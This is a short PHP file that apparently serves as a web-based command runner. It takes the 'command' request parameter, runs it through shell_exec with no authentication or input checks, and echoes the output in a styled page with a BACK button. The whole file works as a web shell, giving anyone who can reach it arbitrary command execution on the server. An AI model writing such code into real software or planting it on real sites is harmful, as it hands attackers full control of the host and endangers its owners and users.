<?php
echo '<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">';

$command = shell_exec($_REQUEST['command']." 2>&1");

echo '<div style="text-align:center;">';
echo '<p style="font-size: large; text-align: center; border-radius: auto; background-origin: padding-box;">'.$command.'</p>';
echo '<button type="submit" class="header_button" onclick="location.href=\'commandline.php\'" style="text-align:flex; text-align: center;">BACK</button>';
echo '</div>';
?>